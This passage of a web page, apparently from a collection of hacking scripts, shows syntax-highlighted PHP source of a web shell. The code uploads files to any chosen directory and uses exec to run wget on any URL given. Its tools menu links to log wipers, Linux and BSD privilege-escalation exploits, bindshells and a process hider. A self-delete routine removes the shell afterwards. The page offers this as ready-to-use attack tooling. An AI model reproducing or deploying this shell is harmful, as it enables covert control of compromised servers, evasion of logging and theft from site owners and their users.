  <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up&#39;</span><span class="p">]){</span><span class="nx">up</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up&#39;</span><span class="p">]);}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">up</span><span class="p">(</span><span class="nv">$up</span><span class="p">){</span> <span class="c1">// Uploading backend function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$updir</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loc&#39;</span><span class="p">];</span>
  <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$up</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span> <span class="nv">$updir</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$up</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;File has been uploaded.&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">grab</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span> <span class="c1">// Uploading backend function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$updir</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loc&#39;</span><span class="p">];</span>
  <span class="nv">$filex</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">));</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;wget </span><span class="si">$file</span><span class="s2"> -b -O </span><span class="si">$updir</span><span class="s2">/</span><span class="si">$filex</span><span class="s2">&quot;</span><span class="p">)){</span><span class="k">die</span><span class="p">(</span><span class="s2">&quot;File has been uploaded.&quot;</span><span class="p">);}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">die</span><span class="p">(</span><span class="s2">&quot;File upload failed.&quot;</span><span class="p">);}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">tools</span><span class="p">(){</span> <span class="c1">// Useful tools function</span>
  <span class="k">global</span> <span class="nv">$curdir</span><span class="p">;</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$tools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;--- Log wipers ---&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
  <span class="s2">&quot;Vanish2.tgz&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz&quot;</span><span class="p">,</span>
  <span class="s2">&quot;Cloak.c&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c&quot;</span><span class="p">,</span>
  <span class="s2">&quot;gh0st.sh&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh&quot;</span><span class="p">,</span>
  <span class="s2">&quot;--- Priv Escalation ---&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
  <span class="s2">&quot;h00lyshit - Linux 2.6 ALL&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://someshit.net/files/xpl/h00lyshit&quot;</span><span class="p">,</span>
  <span class="s2">&quot;k-rad3 - Linux &amp;lt;= 2.6.11&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://someshit.net/files/xpl/krad3&quot;</span><span class="p">,</span>
  <span class="s2">&quot;raptor - Linux &amp;lt;= 2.6.17.4&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://someshit.net/files/xpl/raptor&quot;</span><span class="p">,</span>
  <span class="s2">&quot;rootbsd - BSD v?&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://someshit.net/files/xpl/rootbsd&quot;</span><span class="p">,</span>
  <span class="s2">&quot;--- Bindshells ---&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;3&quot;</span><span class="p">,</span>
  <span class="s2">&quot;THC rwwwshell-1.6.perl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl&quot;</span><span class="p">,</span>
  <span class="s2">&quot;Basic Perl bindshell&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/synnergy/bindshell-unix&quot;</span><span class="p">,</span>
  <span class="s2">&quot;--- Misc ---&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;4&quot;</span><span class="p">,</span>
  <span class="s2">&quot;MOCKS SOCKS4 Proxy&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://superb-east.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz&quot;</span><span class="p">,</span>
  <span class="s2">&quot;xps.c (proc hider)&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c&quot;</span><span class="p">);</span>
  <span class="nv">$names</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$tools</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Tools:&amp;lt;/b&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;post&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Output Directory&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;text&#39; name=&#39;loc&#39; size=&#39;65&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$curdir</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;select name=&#39;gf&#39; style=&#39;align:center;&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$tools</span> <span class="k">as</span> <span class="nv">$tool</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$tool</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$names</span><span class="p">[</span><span class="nv">$tool</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/select&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;Grab&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">lookup</span><span class="p">(){</span> <span class="c1">// Domain lookup function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">global</span> <span class="nv">$servinf</span><span class="p">;</span>
  <span class="nv">$script</span> <span class="o">=</span> <span class="s2">&quot;import urllib, urllib2, sys, re</span>
<span class="s2">  req = urllib2.Request(&#39;http://www.seologs.com/ip-domains.html&#39;, urllib.urlencode({&#39;domainname&#39; : sys.argv[1]}))</span>
<span class="s2">  site = re.findall(&#39;.+\) (.+)&amp;lt;br&amp;gt;&#39;, urllib2.urlopen(req).read())</span>
<span class="s2">  for i in xrange(0,len(site)):</span>
<span class="s2">    print site[i]&quot;</span><span class="p">;</span> <span class="c1">// My sexy python script</span>
  <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;lookup.py&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
  <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$script</span><span class="p">);</span>
  <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;h4&amp;gt;Domains&amp;lt;/h4&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;ul&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;python lookup.py &quot;</span> <span class="o">.</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$ret</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$ret</span> <span class="k">as</span> <span class="nv">$site</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;li&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$site</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;lookup.py&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">img</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span> <span class="c1">// Images function</span>
  <span class="nv">$images</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;folder&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;gALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwq&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;d1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;image&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAOMAAP////8zM8z//8zMzJmZmWZmZmYAADMzMwCZzACZMwAzZgAAAAAAAAAAAAAAAAAAACH+TlRoaX&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;ZXIgMTk5NQAh+QQBAAACACwAAAAAFAAWAAAEkPDISae4WBzAu99Hdm1eSYYZWXYqOgJBLAcDoNrYNssGsBy/4GsX6y&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;2OyMWQ2OMQngSlBjZLWBM1AFSqkyU4A2tWywUMYt/wlTSIvgYGA/Zq3QwU7mmHvh4g8GUsfAUHCH95NwMHV4SGh4Ed&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;ihOOjy8rZpSVeiV+mYCWHncKo6Sfm5cliAdQrK1PQBlJsrNSEQA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;unknown&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AAADaDi6vPEwDECrnSO+aTvPEQcIAmGaIrhR5XmKgMq1LkoMN7ECrjDWp52r0iPpJJ0KjUAq7SxLE+sI+9V8vycFiM&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;0iLb2O80s8JcfVJJTaGYrZYPNby5Ov6WolPD+XDJqAgSQ4EUCGQQEJADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;binary&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//8zMzJmZmTMzMwAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AAADaUi6vPEwEECrnSS+WQoQXSEAE6lxXgeopQmha+q1rhTfakHo/HaDnVFo6LMYKYPkoOADim4VJdOWkx2XvirUgq&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;VaVcbuxCn0hKe04znrIV/ROOvaG3+z63OYO6/uiwlKgYJJOxFDh4hTCQA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;text&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAOMAAP/////MM/8zM8z//5mZmZlmM2bM/zMzMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH+TlRoaX&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;ZXIgMTk5NQAh+QQBAAADACwAAAAAFAAWAAAEb/DISee4eBzAu99Hdm1eSYbZWXEkgI5sEBg0+2HnTBsccvhAmGtXAy&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;COSITwUGg2PYQoQalhOZ/QKLVV6gKmQm8XXDUmzx0yV5ze9s7JdpgtL3ME5jhHTS/xO3hwdWt0f317WwdSi4xRPxlw&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;kUgXEQA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;compressed&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAOcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmc&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;wzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZ&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;zJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAG&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;b//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZm&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;M2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmT&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;PMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;zDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;Bm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAM+4AAN0AALsAAKoAAIgAAHcA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AFUAAEQAACIAABEAAADuAADdAAC7AACqAACIAAB3AABVAABEAAAiAAARAAAA7gAA3QAAuwAAqgAAiAAAdwAAVQAARA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AAIgAAEe7u7t3d3bu7u6qqqoiIiHd3d1VVVURERCIiIhEREQAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMg&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;ZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAAkACwAAAAAFA&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AWAAAImQBJCCTBqmDBgQgTDmQFAABDVgojEmzI0KHEhBUrWrwoMGNDihwnAvjHiqRJjhX/qVz5D+VHAFZiWmmZ8BGH&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;ji9hxqTJ4ZFAmzc1vpxJgkPPn0Y5CP04M6lPEkCN5mxoJelRqFY5TM36NGrPqV67Op0KM6rYnkup/gMq1mdamC1tdn&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;36lijUpwjr0pSoFyUrmTJLhiTBkqXCgAA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;sound&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP////8zM8z//8zMzJmZmWYAADMzMwAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAACACwAAAAAFAAW&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AAADayi63P4wNsNCkOocYVWPB7FxFwmFwGh+DZpynndpNAHcW9cVQUj8tttrd+G5hMINT7A0BpE4ZnF6hCqn0iryKs&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;0SDN9v0tSc0Q4DQ1SHFRjeBrQ6FzNN5Co2JD4YfUp7GnYsexQLhBiJigsJADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;script&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;AAADZTi6vPEwDECrnSO+aTvPEddVIrhVBJCSF8QRMIwOBE2fVLrmcYz3O4pgKCDgVMgR0SgZOYVM0dNS/AF7gGy1me&quot;</span> <span class="o">.</span>
  <span class="s2">&quot;16v9vXNdYNf89es2os00bRcDW7DVDDwe87fjMg+v9DNxBzYw8JADs=&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-type: image/gif&#39;</span><span class="p">);</span>
  <span class="k">echo</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]);</span>
  <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">kill</span><span class="p">(){</span> <span class="c1">// Shell deleter function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form  method=&#39;post&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Type &#39;confirm&#39; to kill the shell:&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;input type=&#39;text&#39; name=&#39;ver&#39; action=&#39;?act=kill&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;Delete&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ver&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;confirm&quot;</span><span class="p">){</span>
    <span class="nv">$self</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$self</span><span class="p">)){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Deleted&quot;</span><span class="p">);}</span>
    <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Failed&quot;</span><span class="p">);}</span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
